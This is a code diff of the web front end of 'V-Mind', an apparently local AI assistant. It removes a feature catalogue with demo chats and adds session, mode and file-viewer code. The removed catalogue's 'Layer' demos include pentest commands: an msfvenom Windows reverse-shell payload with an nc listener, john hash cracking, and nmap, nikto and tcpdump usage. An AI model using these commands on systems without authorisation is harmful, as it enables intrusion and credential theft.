-    demo:'<span class="prompt">You:</span> show my plans\n<span class="prompt">V-Mind:</span> <span class="highlight">Saved Plans:</span>\n<span class="output">1. Build REST API      60% [&#9632;&#9632;&#9632;&#9632;&#9632;&#9631;&#9631;&#9631;&#9631;&#9631;]</span>\n<span class="output">2. Refactor auth       25% [&#9632;&#9632;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;]</span>
-<span class="output">3. Documentation        0%  [&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;&#9631;]</span><span class="cursor"></span>' },
-  { icon:'&#128279;', title:'Dependency Chain',
-    desc:'Get the next actionable tasks whose dependencies are met. Plans persist on disk (~/.v-mind/plans.json) and survive restarts.',
-    caps:['Next actionable tasks','Dependency resolution','Disk persistence','Restart survival'],
-    demo:'<span class="prompt">You:</span> what should I do next?\n<span class="prompt">V-Mind:</span> <span class="highlight">Next tasks ready:</span>\n<span class="output">Task 3: Auth endpoints</span>\n<span class="output">  (dependencies met: DB models completed)</span>\n<span class="output">Task 4: CRUD endpoints</span>
-<span class="output">  (blocked on: Auth endpoints)</span><span class="cursor"></span>' },
-
-  // 40-45: PC Control
-  { icon:'&#128187;', title:'Launch Apps',
-    desc:'Launch any application by name or path with optional arguments. List installed applications from Program Files and Start Menu.',
-    caps:['Launch by name/path','Optional arguments','List installed apps','Fast app search'],
-    demo:'<span class="prompt">You:</span> open chrome with dev tools\n<span class="prompt">V-Mind:</span> Launching <span class="highlight">Chrome</span> with dev tools...\n<span class="output">chrome.exe --auto-open-devtools-for-tabs</span>\n<span class="output">&#9989; Chrome opened in developer mode.</span><span class="cursor"></span>' },
-  { icon:'&#128200;', title:'Process Management',
-    desc:'List running processes with PID, name, CPU%, memory%, start time. Filter by name. Kill any process by name or PID.',
-    caps:['List processes','CPU/RAM per process','Filter by name','Kill by name/PID'],
-    demo:'<span class="prompt">You:</span> kill not responding app\n<span class="prompt">V-Mind:</span> Finding <span class="highlight">notepad.exe</span>...\n<span class="output">PID: 8421 | CPU: 0% | RAM: 14 MB</span>\n<span class="output">Killing process 8421...</span>\n<span class="output">&#9989; Process terminated successfully.</span><span class="cursor"></span>' },
-  { icon:'&#128424;', title:'Mouse & Keyboard',
-    desc:'Move cursor to specific coordinates, click (left/right/middle), type text via keyboard simulation, press individual keys (enter, esc, F5, arrows, etc.).',
-    caps:['Mouse movement','Left/right/middle click','Text typing','Key press simulation'],
-    demo:'<span class="prompt">You:</span> click the start menu\n<span class="prompt">V-Mind:</span> Moving mouse to <span class="highlight">(100, 1050)</span>...\n<span class="output">[Left click]</span>\n<span class="output">Start menu opened. What would you like to launch?</span><span class="cursor"></span>' },
-  { icon:'&#128248;', title:'Screenshot',
-    desc:'Capture screen via mss or PowerShell fallback. Saves as PNG for direct analysis or sharing.',
-    caps:['Screen capture','mss / PowerShell','PNG output','Vision analysis ready'],
-    demo:'<span class="prompt">You:</span> take a screenshot\n<span class="prompt">V-Mind:</span> Capturing screen...\n<span class="output">[Screenshot saved: screenshot_2026-07-04.png]</span>\n<span class="output">I can see your desktop with a VS Code window open</span>
-<span class="output">and a terminal running a Python script.</span><span class="cursor"></span>' },
-  { icon:'&#128203;', title:'Clipboard',
-    desc:'Read current clipboard contents as text. Write text to clipboard. Monitor clipboard changes for proactive events.',
-    caps:['Clipboard read','Clipboard write','Change monitoring','Text-only support'],
-    demo:'<span class="prompt">You:</span> paste clipboard\n<span class="prompt">V-Mind:</span> Reading clipboard...\n<span class="output">Contents: "def hello():\n    print(\'Hello, World!\')"</span>
-<span class="output">Copied to chat. Want me to write this to a file?</span><span class="cursor"></span>' },
-  { icon:'&#128265;', title:'Window Management',
-    desc:'List all open window titles. Bring any matching window to the foreground by title text.',
-    caps:['List open windows','Title-based search','Foreground activation','Window focus'],
-    demo:'<span class="prompt">You:</span> switch to VS Code\n<span class="prompt">V-Mind:</span> Looking for window matching <span class="highlight">"VS Code"</span>...\n<span class="output">Found: Visual Studio Code - v-mind-ai</span>\n<span class="output">Bringing to foreground...</span>
-<span class="output">&#9989; VS Code is now active.</span><span class="cursor"></span>' },
-
-  // 46-50: System
-  { icon:'&#128200;', title:'System Info',
-    desc:'Detailed system info: OS name/version, CPU cores/usage, RAM total/used, disk usage, boot time, Python version, hostname.',
-    caps:['OS details','CPU cores & usage','RAM & disk stats','Boot time & hostname'],
-    demo:'<span class="prompt">You:</span> system info\n<span class="prompt">V-Mind:</span> <span class="highlight">System Information:</span>\n<span class="output">OS: Windows 11 Pro (23H2)</span>\n<span class="output">CPU: Intel i7-13700H (16 cores) | Usage: 23%</span>\n<span class="output">RAM: 8.2/16 GB (51%)</span>\n<span class="output">Disk: 234/512 GB (45%)</span>\n<span class="output">Hostname: DESKTOP-7X3K</span><span class="cursor"></span>' },
-  { icon:'&#9889;', title:'Power Commands',
-    desc:'Execute power commands from chat: shutdown, restart, sleep, hibernate, lock, logoff. Confirmation prompts for safety.',
-    caps:['Shutdown / Restart','Sleep / Hibernate','Lock / Logoff','Confirmation prompt'],
-    demo:'<span class="prompt">You:</span> restart the PC\n<span class="prompt">V-Mind:</span> Are you sure you want to <span class="highlight">restart</span>? (y/n)\n<span class="prompt">You:</span> yes\n<span class="prompt">V-Mind:</span> Restarting in 10 seconds... Save your work!</span><span class="cursor"></span>' },
-  { icon:'&#128266;', title:'Volume & Notify',
-    desc:'Set system volume level (0-100). Show Windows toast notifications with custom messages.',
-    caps:['Volume control (0-100)','Toast notifications','PowerShell fallback','System-level'],
-    demo:'<span class="prompt">You:</span> set volume to 50% and notify me when done\n<span class="prompt">V-Mind:</span> Setting volume to <span class="highlight">50%</span>...\n<span class="output">[Volume set]</span>\n<span class="output">[Notification sent: "Task complete - V-Mind"]</span><span class="cursor"></span>' },
-  { icon:'&#128267;', title:'Battery & Ping',
-    desc:'Get battery charge percentage and status. Ping any host to check network reachability.',
-    caps:['Battery percentage','Charge status','Ping host','Reachability check'],
-    demo:'<span class="prompt">You:</span> check battery and ping google\n<span class="prompt">V-Mind:</span> <span class="highlight">Battery: 87% (charging)</span>\n<span class="output">Pinging google.com...</span>
-<span class="output">Reply from 142.250.80.14: time=12ms</span>
-<span class="output">&#9989; Network is working.</span><span class="cursor"></span>' },
-  { icon:'&#128274;', title:'Port Scanning',
-    desc:'Async TCP port scanning on any host. Checks which ports are open with connection-based probing.',
-    caps:['Async TCP scan','Any host','Open port detection','Connection-based'],
-    demo:'<span class="prompt">You:</span> scan ports on localhost\n<span class="prompt">V-Mind:</span> Scanning <span class="highlight">127.0.0.1</span> (common ports)...\n<span class="output">Port  80:  open (HTTP)</span>
-<span class="output">Port 443:  open (HTTPS)</span>
-<span class="output">Port 11434: open (Ollama)</span>
-<span class="output">Port 8765:  open (V-Mind)</span>
-<span class="output">Scanned 20 ports, 4 open.</span><span class="cursor"></span>' },
-
-  // 51-52: Voice
-  { icon:'&#127908;', title:'Speech-to-Text',
-    desc:'Browser SpeechRecognition API for voice input. Speak naturally and V-Mind transcribes your words into chat messages.',
-    caps:['SpeechRecognition API','Real-time transcription','Browser-based','Hands-free input'],
-    demo:'<span class="prompt">[&#127908; Listening...]</span>\n<span class="prompt">You:</span> "what is the weather today"\n<span class="prompt">V-Mind:</span> Let me check the weather for you.\n<span class="output">Searching weather data...</span>
-<span class="highlight">Sunny, 28&deg;C. No rain expected.</span><span class="cursor"></span>' },
-  { icon:'&#128266;', title:'Text-to-Speech',
-    desc:'Windows TTS (System.Speech) and browser SpeechSynthesis. V-Mind speaks responses aloud for true hands-free interaction.',
-    caps:['Windows SAPI TTS','Browser SpeechSynthesis','Response read-aloud','Toggle on/off'],
-    demo:'<span class="prompt">You:</span> read that aloud\n<span class="prompt">V-Mind:</span> <span class="highlight">[Speech: "Today will be sunny with a high of 28 degrees Celsius. No rain is expected."]</span>
-<span class="output">&#127911; Audio output complete.</span><span class="cursor"></span>' },
-
-  // 53-58: The Layer
-  { icon:'&#128270;', title:'Recon Tools',
-    desc:'Reference for network reconnaissance tools: nmap (network discovery), netdiscover (ARP scanning), dnsrecon (DNS enumeration).',
-    caps:['nmap reference','netdiscover guide','dnsrecon syntax','Usage examples'],
-    demo:'<span class="prompt">You:</span> how to use nmap?\n<span class="prompt">V-Mind:</span> <span class="highlight">nmap - Network Mapper</span>\n<span class="output">Scan subnet: nmap -sn 192.168.1.0/24</span>
-<span class="output">Port scan:   nmap -p 1-1000 target.com</span>
-<span class="output">OS detect:   nmap -O target.com</span>
-<span class="output">Aggressive:  nmap -A target.com</span><span class="cursor"></span>' },
-  { icon:'&#128269;', title:'Scanning Tools',
-    desc:'Reference for web/service vulnerability scanners: nikto (web server), wpscan (WordPress), dirb/gobuster (directory brute-force).',
-    caps:['nikto web scanner','wpscan WordPress','dirb directory search','gobuster brute-force'],
-    demo:'<span class="prompt">You:</span> scan a website with nikto\n<span class="prompt">V-Mind:</span> <span class="highlight">nikto -h https://target.com</span>\n<span class="output">Checks for: outdated servers, dangerous files,</span>
-<span class="output">CGI issues, and server configuration problems.</span>
-<span class="output">Use -ssl for HTTPS, -port to specify port.</span><span class="cursor"></span>' },
-  { icon:'&#128520;', title:'Exploitation',
-    desc:'Reference for exploitation frameworks: msfconsole/metasploit, msfvenom (payload generator), sqlmap (SQL injection), hydra (password brute-force).',
-    caps:['Metasploit reference','msfvenom payloads','sqlmap injection','hydra brute-force'],
-    demo:'<span class="prompt">You:</span> generate a reverse shell\n<span class="prompt">V-Mind:</span> <span class="highlight">msfvenom -p windows/x64/shell_reverse_tcp</span>
-<span class="output">  LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe</span>
-<span class="output">Creates a Windows 64-bit reverse TCP shell.</span>
-<span class="output">Listener: nc -lvnp 4444</span><span class="cursor"></span>' },
-  { icon:'&#128295;', title:'Post-Exploitation',
-    desc:'Reference for post-exploitation: linpeas (Linux enum), enum4linux (Windows/Samba enum), john/hashcat (password cracking).',
-    caps:['linpeas enumeration','enum4linux Samba','john the ripper','hashcat GPU cracking'],
-    demo:'<span class="prompt">You:</span> crack a hash with john\n<span class="prompt">V-Mind:</span> <span class="highlight">john --format=raw-md5 --wordlist=rockyou.txt hash.txt</span>
-<span class="output">Cracks MD5 hashes using the rockyou wordlist.</span>
-<span class="output">For NTLM: john --format=nt hash.txt</span>
-<span class="output">Show cracked: john --show hash.txt</span><span class="cursor"></span>' },
-  { icon:'&#128279;', title:'Web & Network',
-    desc:'Reference for web/network tools: whatweb (fingerprint), wfuzz (fuzzer), burpsuite (proxy), tcpdump/tshark (packet capture), aireplay/macchanger (wireless).',
-    caps:['whatweb fingerprint','wfuzz fuzzing','burpsuite proxy','tcpdump/tshark'],
-    demo:'<span class="prompt">You:</span> capture network traffic\n<span class="prompt">V-Mind:</span> <span class="highlight">tcpdump -i eth0 -w capture.pcap</span>
-<span class="output">Captures packets on eth0 to a file.</span>
-<span class="output">Filter: tcpdump -i eth0 port 80</span>
-<span class="output">Read: tcpdump -r capture.pcap</span><span class="cursor"></span>' },
-  { icon:'&#128187;', title:'Interactive TUI',
-    desc:'Full terminal UI with Rich layout, session sidebar, simulated Kali environment. Built-in commands: ls, cat, pwd, echo, whoami, neofetch. Real tool execution when available.',
-    caps:['Rich TUI interface','Simulated Kali env','Built-in commands','Real tool execution'],
-    demo:'<span class="prompt">[Opening Layer TUI...]</span>\n<span class="output">&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;&#9612;</span>
-<span class="output">root@kali:~# ls -la</span>
-<span class="output">total 24</span>
-<span class="output">drwxr-xr-x  root root  4096 tools/</span>
-<span class="output">-rw-r--r--  root root   142 README.md</span>
-<span class="output">root@kali:~# neofetch</span>
-<span class="output">OS: Kali Linux Rolling x86_64</span>
-<span class="output">Kernel: 6.8.11-amd64</span><span class="cursor"></span>' },
-
-  // 59-61: Library
-  { icon:'&#128218;', title:'Built-in Books',
-    desc:'Pre-loaded reference guides: Python 3 Quick Reference, Git Mastery, Linux CLI Handbook, Algorithms & Data Structures. Always accessible.',
-    caps:['Python 3 quick ref','Git mastery guide','Linux CLI handbook','Algorithms & data structures'],
-    demo:'<span class="prompt">You:</span> open the python reference\n<span class="prompt">V-Mind:</span> <span class="highlight">Python 3 Quick Reference</span>\n<span class="output"># Data Types</span>
-<span class="output">  int, float, str, list, dict, tuple, set</span>
-<span class="output"># Control Flow</span>
-<span class="output">  if/elif/else, for, while, match/case</span>
-<span class="output"># Functions</span>
-<span class="output">  def f():, lambda, *args, **kwargs</span>
-<span class="output">Available: 6 sections, 142 entries.</span><span class="cursor"></span>' },
-  { icon:'&#128214;', title:'Book Reader',
-    desc:'Full in-app reader with markdown rendering: headings, code blocks, paragraphs, lists. Navigate through book content seamlessly.',
-    caps:['Markdown rendering','Code blocks','Headings & lists','Navigation'],
-    demo:'<span class="prompt">[Reader opened: Git Mastery]</span>\n<span class="output"># Git Mastery - Quick Reference</span>
-<span class="output">## Branching</span>
-<span class="output">  git branch &lt;name&gt;    Create branch</span>
-<span class="output">  git checkout &lt;name&gt;  Switch branch</span>
-<span class="output">  git merge &lt;name&gt;     Merge branch</span>
-<span class="output">  git branch -d &lt;name&gt; Delete branch</span>
-<span class="output">Page 1 of 24</span><span class="cursor"></span>' },
-  { icon:'&#128228;', title:'Search & Upload',
-    desc:'Search local books by title. Upload new books. Web catalog lookup with cover art from Open Library API.',
-    caps:['Local book search','Book upload','Web catalog lookup','Cover art fetching'],
-    demo:'<span class="prompt">You:</span> find books about algorithms\n<span class="prompt">V-Mind:</span> <span class="highlight">Search results:</span>\n<span class="output">1. Algorithms & Data Structures (local)</span>
-<span class="output">2. Introduction to Algorithms (web catalog)</span>
-<span class="output">3. Grokking Algorithms (web catalog)</span>
-<span class="output">Download or open directly?</span><span class="cursor"></span>' },
-
-  // 62-65: Monitoring
-  { icon:'&#128200;', title:'Resource Monitor',
-    desc:'Monitors CPU (>90% spike), RAM (>90% spike), process start/end events, and clipboard changes. All events logged for review.',
-    caps:['CPU spike detection','RAM spike detection','Process tracking','Clipboard monitoring'],
-    demo:'<span class="prompt">[Alert: CPU spike detected]</span>\n<span class="prompt">V-Mind:</span> <span class="highlight">&#9888; CPU usage spiked to 95%</span>\n<span class="output">Top process: chrome.exe (42% CPU)</span>
-<span class="output">Recommendation: Consider closing unused tabs.</span><span class="cursor"></span>' },
-  { icon:'&#128196;', title:'File Watcher',
-    desc:'Detects file creations, modifications, and deletions using watchdog. Stores last 500 events. Queryable via API.',
-    caps:['Create/modify/delete detection','Watchdog integration','500-event buffer','API queryable'],
-    demo:'<span class="prompt">[File change detected]</span>\n<span class="prompt">V-Mind:</span> <span class="highlight">Modified: v_mind/agent.py</span>
-<span class="output">Recent events:</span>
-<span class="output">  12:34:01  modified  agent.py</span>
-<span class="output">  12:33:55  created   new_feature.py</span>
-<span class="output">  12:32:10  deleted   temp_test.py</span><span class="cursor"></span>' },
-  { icon:'&#128276;', title:'Proactive Alerts',
-    desc:'Browser notifications for important system events: process ended, CPU/RAM spike, file created/deleted. Background polling.',
-    caps:['Browser notifications','Process/CPU/RAM alerts','File change alerts','Background polling'],
-    demo:'<span class="prompt">[Browser Notification]</span>\n<span class="output">V-Mind: Process "notepad.exe" has ended.</span>
-<span class="prompt">[Browser Notification]</span>\n<span class="output">V-Mind: File "report.pdf" was created.</span>
-<span class="output">Notifications are sent in real-time while V-Mind runs.</span><span class="cursor"></span>' },
-  { icon:'&#128065;', title:'Vision Monitor',
-    desc:'Captures screenshots every 3 seconds and sends them to a vision AI model for real-time description of what is happening on screen.',
-    caps:['3-second capture interval','Vision AI analysis','Screen description','Analysis history (50)'],
-    demo:'<span class="prompt">[Vision Monitor active]</span>\n<span class="prompt">V-Mind:</span> <span class="highlight">Screen Analysis #47</span>
-<span class="output">"VS Code is open with a Python file. The terminal</span>
-<span class="output">shows a running Flask dev server on port 5000.</span>
-<span class="output">A Chrome window is visible in the background."</span>
-<span class="output">Monitoring every 3s. 50 analyses stored.</span><span class="cursor"></span>' },
-
-  // 66-68: Context & Memory
-  { icon:'&#128203;', title:'Project Context',
-    desc:'Save current task context, architecture notes, and decisions with automatic timestamps. Retrieve by key or list all saved context.',
-    caps:['Save context with timestamp','Retrieve by key','List all context','Architecture notes'],
-    demo:'<span class="prompt">You:</span> remember the architecture decision\n<span class="prompt">V-Mind:</span> <span class="highlight">Context saved:</span>
-<span class="output">Key: "arch-dec-2026-07-04"</span>
-<span class="output">Content: Using FastAPI with async SQLAlchemy</span>
-<span class="output">for the database layer to support WebSockets.</span>
-<span class="output">&#9989; Saved. Retrieve with "get_context arch-*"</span><span class="cursor"></span>' },
-  { icon:'&#128214;', title:'File Memory',
-    desc:'Remember what each file is for — its purpose and role in the project. Query context about any remembered file anytime.',
-    caps:['File purpose memory','Role documentation','File context query','Project awareness'],
-    demo:'<span class="prompt">You:</span> what is agent.py for?\n<span class="prompt">V-Mind:</span> <span class="highlight">agent.py</span>
-<span class="output">Purpose: Core AI agent that manages the LLM</span>
-<span class="output">backend selection, conversation history, and</span>
-<span class="output">tool-calling loop. Orchestrates all AI operations.</span><span class="cursor"></span>' },
-  { icon:'&#129504;', title:'Long-Term Memory',
-    desc:'Save information to persistent memory with key, content, and category tag. Search across all saved memories. Survives restarts.',
-    caps:['Save with key/content/tag','Semantic search','Cross-session memory','Disk persistence'],
-    demo:'<span class="prompt">You:</span> remember my favorite color is blue\n<span class="prompt">V-Mind:</span> <span class="highlight">Memory saved:</span>
-<span class="output">Key: "user-preference-color"</span>
-<span class="output">Category: user_preferences</span>
-<span class="output">&#9989; I\'ll remember that! Ask me "what\'s my favorite color" anytime.</span><span class="cursor"></span>' },
-
-  // 69-71: Extras
-  { icon:'&#128295;', title:'Generate Projects',
-    desc:'Describe a project in natural language and V-Mind builds the entire codebase from scratch using Spec Mode. Creates structure, code, and configuration.',
-    caps:['Natural language input','Full codebase generation','Spec Mode execution','Complete project output'],
-    demo:'<span class="prompt">You:</span> generate a CLI todo app\n<span class="prompt">V-Mind:</span> <span class="highlight">Generating project...</span>
-<span class="output">&#9989; Created: todo-cli/</span>
-<span class="output">  &#128196; todo.py (entry point)</span>
-<span class="output">  &#128196; storage.py (JSON persistence)</span>
-<span class="output">  &#128196; commands.py (add/list/done/del)</span>
-<span class="output">  &#128196; requirements.txt</span>
-<span class="output">  &#128196; README.md</span>
-<span class="output">All done! Run with: python todo.py</span><span class="cursor"></span>' },
-  { icon:'&#127912;', title:'Dynamic Backgrounds',
-    desc:'12+ animated Kali-themed backgrounds arranged in a 6-panel grid. Cycles every hour for a fresh look throughout the day.',
-    caps:['12+ backgrounds','6-panel grid','Hourly cycling','Kali-themed art'],
-    demo:'<span class="prompt">[Backgrounds cycling...]</span>\n<span class="output">Panel 1: Kali dragon theme</span>
-<span class="output">Panel 2: Terminal matrix</span>
-<span class="output">Panel 3: Code waterfall</span>
-<span class="output">Next cycle in: 42 minutes</span>
-<span class="output">6 panels refresh every hour automatically.</span><span class="cursor"></span>' },
-  { icon:'&#128752;', title:'Works Offline',
-    desc:'Powered by Ollama. Run V-Mind entirely offline with local models. No internet required after initial setup. Your data never leaves your machine.',
-    caps:['Fully offline operation','Ollama local models','No data leaves your PC','Privacy-first design'],
-    demo:'<span class="prompt">You:</span> are you online?\n<span class="prompt">V-Mind:</span> <span class="highlight">Mode: Offline</span>
-<span class="output">No internet connection needed.</span>
-<span class="output">Running tinyllama locally via Ollama.</span>
-<span class="output">Your data stays on your machine.</span>
-<span class="output">Speed: 24 tok/s on CPU</span>
-<span class="highlight">&#9989; Fully operational without internet.</span><span class="cursor"></span>' }
-];
-
-function showFeature(idx) {
-  const f = features[idx];
-  if (!f) return;
-  document.getElementById('micon').innerHTML = f.icon;
-  document.getElementById('mtitle').textContent = f.title;
-  let capsHtml = f.caps ? '<ul class="cap-list">' + f.caps.map(c => '<li>' + c + '</li>').join('') + '</ul>' : '';
-  document.getElementById('mbody').innerHTML = `<p class="desc">${f.desc}</p>${capsHtml}<div class="demo-box">${f.demo}</div>`;
-  document.getElementById('modal').classList.add('show');
+// Patch fetch
+const origFetch=window.fetch
+window.fetch=function(url,opts){
+  if(typeof url==='string'&&url.startsWith('/api/'))url=backendUrl.replace(/\/+$/,'')+url
+  return origFetch.call(window,url,opts)
 }
 
-function closeModal() {
-  document.getElementById('modal').classList.remove('show');
+function esc(s){let d=document.createElement('div');d.textContent=s;return d.innerHTML}
+function escJs(s){return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'")}
+
+// --- LANDING ---
+document.getElementById('app').style.display='flex'
+
+function showLanding(){
+  document.getElementById('app').style.display='none'
+  document.querySelector('.landing').style.display='flex'
 }
-document.getElementById('modal').addEventListener('click', function(e) { if (e.target === this) closeModal(); });
-document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
+// Remove landing since app shows directly
+document.querySelector('.landing')?.remove()
 
-let mode = 'backend';
-let backendUrl = localStorage.getItem('vmBackendUrl') || 'http://127.0.0.1:8765';
-let apiKey = localStorage.getItem('vmApiKey') || '';
-let apiProvider = localStorage.getItem('vmApiProvider') || 'openai';
-let loading = false;
-
-const urlInput = document.getElementById('backendUrl');
-const statusDot = document.getElementById('statusDot');
-const connStatus = document.getElementById('connStatus');
-const chatInput = document.getElementById('chatInput');
-const sendBtn = document.getElementById('sendBtn');
-const chatMessages = document.getElementById('chat-messages');
-const apiKeyInput = document.getElementById('apiKeyInput');
-const apiProviderEl = document.getElementById('apiProvider');
-const modelSelect = document.getElementById('modelSelect');
-
-urlInput.value = backendUrl;
-apiKeyInput.value = apiKey;
-apiProviderEl.value = apiProvider;
-
-const origFetch = window.fetch;
-window.fetch = function(url, opts) {
-  if (typeof url === 'string' && url.startsWith('/api/')) url = backendUrl.replace(/\/+$/, '') + url;
-  return origFetch.call(window, url, opts);
-};
-
-function setMode(m) {
-  mode = m;
-  document.getElementById('modeBackend').className = 'mode-tab' + (m === 'backend' ? ' active' : '');
-  document.getElementById('modeApi').className = 'mode-tab' + (m === 'api' ? ' active' : '');
-  document.getElementById('apiSettings').style.display = m === 'api' ? 'flex' : 'none';
-  document.getElementById('backendUrl').style.display = m === 'backend' ? 'block' : 'none';
-  if (m === 'api') {
-    chatInput.disabled = !apiKey; sendBtn.disabled = !apiKey;
-    connStatus.textContent = apiKey ? 'API key set' : 'Enter API key';
-    statusDot.className = 'status-dot' + (apiKey ? ' online' : '');
-    if (apiKey) chatInput.focus();
-  } else { checkConnection(); }
+// --- SIDEBAR ---
+function toggleSidebar(){sidebarVisible=!sidebarVisible;document.getElementById('sidebar').style.display=sidebarVisible?'flex':'none'}
+function newSession(){let id='s_'+Date.now();sessions.unshift({id:id,name:'New chat'});saveSessions();switchSession(id);renderSessions()}
+function switchSession(id){activeSession=id;sid=id;localStorage.setItem('vms',id);renderSessions();document.getElementById('chat-inner').innerHTML='<div class="chat-msg" style="color:var(--dim)">New session started.</div>'}
+function deleteSession(id){sessions=sessions.filter(s=>s.id!==id);saveSessions();if(activeSession===id)switchSession(sessions[0]?.id||'default');renderSessions()}
+function renameSession(id){let s=sessions.find(x=>x.id===id);if(!s)return;let n=prompt('Rename session:',s.name);if(n&&n.trim()){s.name=n.trim();saveSessions();renderSessions()}closeAllMenus()}
+function toggleMenu(id,e){e.stopPropagation();closeAllMenus();let m=document.getElementById('sm-'+id);if(m)m.classList.toggle('show')}
+function closeAllMenus(){document.querySelectorAll('.sctx.show').forEach(m=>m.classList.remove('show'))}
+document.addEventListener('click',closeAllMenus)
+function saveSessions(){localStorage.setItem('vmsess',JSON.stringify(sessions))}
+function renderSessions(){
+  document.getElementById('session-list').innerHTML=sessions.map(s=>'<div class="session-item'+(s.id===activeSession?' active':'')+'" onclick="switchSession(\''+s.id+'\')"><span class="sname">'+esc(s.name)+'</span><button class="smenu" onclick="toggleMenu(\''+s.id+'\',event)">...</button><div class="sctx" id="sm-'+s.id+'"><button onclick="renameSession(\''+s.id+'\')">Rename</button><button onclick="deleteSession(\''+s.id+'\')" style="color:var(--red)">Delete</button></div></div>').join('')
 }
 
-apiKeyInput.addEventListener('change', () => {
-  apiKey = apiKeyInput.value.trim();
-  localStorage.setItem('vmApiKey', apiKey);
-  if (mode === 'api') {
-    connStatus.textContent = apiKey ? 'API key set' : 'Enter API key';
-    statusDot.className = 'status-dot' + (apiKey ? ' online' : '');
-    chatInput.disabled = !apiKey; sendBtn.disabled = !apiKey;
-    if (apiKey) chatInput.focus();
-  }
-});
-
-apiProviderEl.addEventListener('change', () => {
-  apiProvider = apiProviderEl.value;
-  localStorage.setItem('vmApiProvider', apiProvider);
-  if (apiProvider === 'openrouter') {
-    modelSelect.innerHTML = '<option value="openai/gpt-4o">GPT-4o</option><option value="anthropic/claude-3.5-sonnet">Claude 3.5 Sonnet</option><option value="meta-llama/llama-3.3-70b-instruct">Llama 3.3 70B</option><option value="mistralai/mistral-7b-instruct">Mistral 7B</option>';
-  } else {
-    modelSelect.innerHTML = '<option value="gpt-4o-mini">GPT-4o Mini</option><option value="gpt-4o">GPT-4o</option><option value="gpt-4.1">GPT-4.1</option>';
-  }
-});
-
-function showLanding() {
-  document.getElementById('landing').style.display = 'flex';
-  document.getElementById('app').style.display = 'none';
+// --- MODE ---
+function setMode(m){
+  currentMode=m;localStorage.setItem('vmmode',m)
+  document.querySelectorAll('#mode-toggle button').forEach(b=>b.classList.toggle('active',b.dataset.mode===m))
+  let badge=document.getElementById('mode-badge')
+  if(m==='vibe'){badge.textContent='~ Vibe';badge.style.color='var(--green)';badge.style.background='#1a2e1a'}
+  else{badge.textContent='# Spec';badge.style.color='var(--accent)';badge.style.background='#1a2744'}
 }
 
-function openApp() {
-  document.getElementById('landing').style.display = 'none';
-  document.getElementById('app').style.display = 'flex';
-  if (mode === 'backend') checkConnection(); else setMode('api');
+// --- APP MODE ---
+function setAppMode(m){
+  appMode=m;localStorage.setItem('vmAppMode',m)
+  document.getElementById('modeBackend').className='mode-tab'+(m==='backend'?' active':'')
+  document.getElementById('modeApi').className='mode-tab'+(m==='api'?' active':'')
+  document.getElementById('apiSettings').style.display=m==='api'?'flex':'none'
+  document.getElementById('backendUrl').style.display=m==='backend'?'block':'none'
+  document.getElementById('chat-input').disabled=m==='api'&&!apiKey
+  document.getElementById('send-btn').disabled=m==='api'&&!apiKey
+  if(m==='api'&&apiKey)document.getElementById('chat-input').focus()
 }
 
-urlInput.addEventListener('change', () => {
-  backendUrl = urlInput.value.replace(/\/+$/, '');
-  localStorage.setItem('vmBackendUrl', backendUrl);
-  checkConnection();
-});
+// --- VIEWS ---
+function switchView(v){
+  document.querySelectorAll('.item[data-view]').forEach(n=>n.classList.remove('active'))
+  let el=document.querySelector('.item[data-view="'+v+'"]')
+  if(el)el.classList.add('active')
+  document.getElementById('panel-chat').style.display=v==='chat'?'flex':'none'
+  document.getElementById('panel-review').style.display=v==='chat'?'flex':'none'
+  document.getElementById('panel-files').style.display=v==='chat'?'flex':'none'
+  document.getElementById('layer-view')?.style.setProperty('display',v==='layer'?'flex':'none')
+  document.getElementById('browser-view')?.style.setProperty('display',v==='browser'?'flex':'none')
+  document.getElementById('library-view')?.style.setProperty('display',v==='library'?'flex':'none')
+  document.getElementById('settings-view').style.display=v==='settings'?'flex':'none'
+  document.getElementById('terminal').style.display=v==='settings'?'none':''
+  if(v==='chat'){switchReviewTab('code',document.querySelector('#rev-tabs button'));if(currentFile)openFile(currentFile)}
+}
 
-async function checkConnection() {
-  statusDot.className = 'status-dot';
-  connStatus.textContent = 'Connecting...';
-  try {
-    let r = await origFetch(backendUrl + '/api/status', { signal: AbortSignal.timeout(5000) });
-    if (!r.ok) throw new Error('Not OK');
-    await r.json();
-    statusDot.classList.add('online');
-    connStatus.textContent = 'Online';
-    chatInput.disabled = false; sendBtn.disabled = false;
-    chatInput.focus();
-    chatMessages.innerHTML = '<div class="chat-msg assistant" style="color:var(--dim)">Connected! Start chatting with V-Mind.</div>';
-  } catch(e) {
-    statusDot.classList.add('offline');
-    connStatus.textContent = 'Offline - ' + e.message;
-    chatInput.disabled = true; sendBtn.disabled = true;
+// --- CODE VIEWER ---
+async function openFile(path){
+  currentFile=path
+  switchReviewTab('code',document.querySelector('#rev-tabs button'))
+  try{
+    let r=await fetch('/api/file?path='+encodeURIComponent(path))
+    let d=await r.json()
+    if(d.error){document.getElementById('cv-content').textContent='Error: '+d.error;document.getElementById('cv-path').textContent='Error';return}
+    document.getElementById('cv-path').textContent=d.path
+    let lines=d.content.split('\n')
+    document.getElementById('cv-content').innerHTML=lines.map((l,i)=>'<span class="line-num">'+(i+1)+'</span>'+esc(l)).join('\n')
+  }catch(ex){document.getElementById('cv-content').textContent='Error: '+ex.message}
+}
+
+// --- FILE TREE ---
+async function openFolder(){
+  if(typeof pywebview!=='undefined'&&pywebview.api){
+    let folder=await pywebview.api.pick_folder()
+    if(folder){document.getElementById('file-path-input').value=folder;loadFileTree(folder)}
+  }else{document.getElementById('folder-picker').click()}
+}
+function onFolderPicked(files){
+  if(!files||!files.length)return
+  let f=files[0],folder
+  if(f.path&&f.webkitRelativePath)folder=f.path.slice(0,-f.webkitRelativePath.length-1)
+  else if(f.path)folder=f.path.replace(/\\[^\\]+$/,'')
+  else return alert('Folder path not available.')
+  document.getElementById('file-path-input').value=folder;loadFileTree(folder)
+}
+async function loadFileTree(dir){
+  localStorage.setItem('vmfolder',dir)
+  let el=document.getElementById('file-tree')
+  try{
+    let r=await fetch('/api/files?dir='+encodeURIComponent(dir))
+    let d=await r.json()
+    if(d.error){el.innerHTML='<div style="color:var(--red);padding:8px;font-size:11px">Error: '+esc(d.error)+'</div>';return}
